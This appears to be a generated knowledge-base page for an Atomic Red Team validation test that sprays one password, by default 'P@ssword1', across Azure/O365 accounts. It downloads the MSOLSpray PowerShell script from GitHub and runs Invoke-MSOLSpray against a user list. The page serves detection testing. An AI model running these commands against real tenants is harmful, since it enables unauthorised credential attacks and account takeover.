---
atomic_guid: "f3a10056-0160-4785-8744-d9bd7c12dc39"
title: "Password Spray Microsoft Online Accounts with MSOLSpray (Azure/O365)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1110.003"
attack_technique_name: "Brute Force: Password Spraying"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1110.003.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "f3a10056-0160-4785-8744-d9bd7c12dc39"
  - "Password Spray Microsoft Online Accounts with MSOLSpray (Azure/O365)"
platforms:
  - "azure-ad"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Password Spray Microsoft Online Accounts with MSOLSpray (Azure/O365)

This test attempts to brute force a list of Microsoft Online (Azure/O365) users with a single password via the MSOLSpray Powershell module.

## Metadata

- Atomic GUID: f3a10056-0160-4785-8744-d9bd7c12dc39
- Technique: T1110.003: Brute Force: Password Spraying
- Platforms: azure-ad
- Executor: powershell
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1110.003/T1110.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1110-brute_force|T1110.003]]

## Input Arguments

### password

- description: Single password to try against the list of user accounts
- type: string
- default: P@ssword1

### user_list

- description: File path to list of users (one per line, formatted as user@subdomain.onmicrosoft.com)
- type: string
- default: $env:temp\T1110.003UserList.txt

## Dependencies

MSOLSpray module must exist in PathToAtomicsFolder\..\ExternalPayloads.

### Prerequisite Check

```powershell
if (test-path "PathToAtomicsFolder\..\ExternalPayloads\MSOLSpray.ps1"){exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
invoke-webrequest "https://raw.githubusercontent.com/dafthack/MSOLSpray/922f159104fb3ec77c9fc6507a6388a05c227b5f/MSOLSpray.ps1" -outfile "PathToAtomicsFolder\..\ExternalPayloads\MSOLSpray.ps1"
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
import-module "PathToAtomicsFolder\..\ExternalPayloads\MSOLSpray.ps1"
Invoke-MSOLSpray -UserList "#{user_list}" -Password "#{password}"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1110.003.yaml)
